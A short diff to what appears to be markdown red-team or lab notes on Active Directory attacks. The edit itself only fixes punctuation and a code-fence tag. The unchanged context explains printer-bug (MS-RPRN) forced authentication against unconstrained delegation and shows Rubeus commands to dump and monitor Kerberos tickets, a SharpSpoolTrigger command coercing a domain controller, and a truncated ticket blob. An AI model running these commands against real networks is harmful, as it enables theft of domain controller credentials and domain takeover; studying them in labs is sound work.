@@ -47,14 +47,14 @@ C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2
 woIGwkMuSU92GH23KL....==
 ```
 # Exploiting Unconstrained delegation via forced authentication
-Recently discovered a feature of MS-RPRN which allows any authenticated domain user can force any machine running spooler service to connect to a second machine of the user's choice. We can obtain TGT for machine accounts by forcing them to authenticate to this machine. If unconstrained delegation exists in a machine we can also leverage this to force domain controller to authenticate to this machine to get the TGT of machine account which we can everage via `S4U2Self` abuse. Below we are using Rubeus on app01 to continuously monitor for TGTs
+Recently discovered a feature of MS-RPRN which allows any authenticated domain user can force any machine running spooler service to connect to a second machine of the user's choice. We can obtain TGT for machine accounts by forcing them to authenticate to this machine. If unconstrained delegation exists in a machine we can also leverage this to force domain controller to authenticate to this machine to get the TGT of machine account which we can everage via `S4U2Self` abuse. Below we are using Rubeus on app01 to continuously monitor for TGTs.
 
 ```powershell
 C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
 ```
 On any compromised machine we can use SharpSpoolTrigger to force dc.dev.dhitalcorp.local to authenticate to APP01.dev.dhitalcorp.local
 
-```
+```powershell
 C:\Users\Alex> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc.dev.dhitalcorp.local app01.dev.dhitalcorp.local
 ```
 
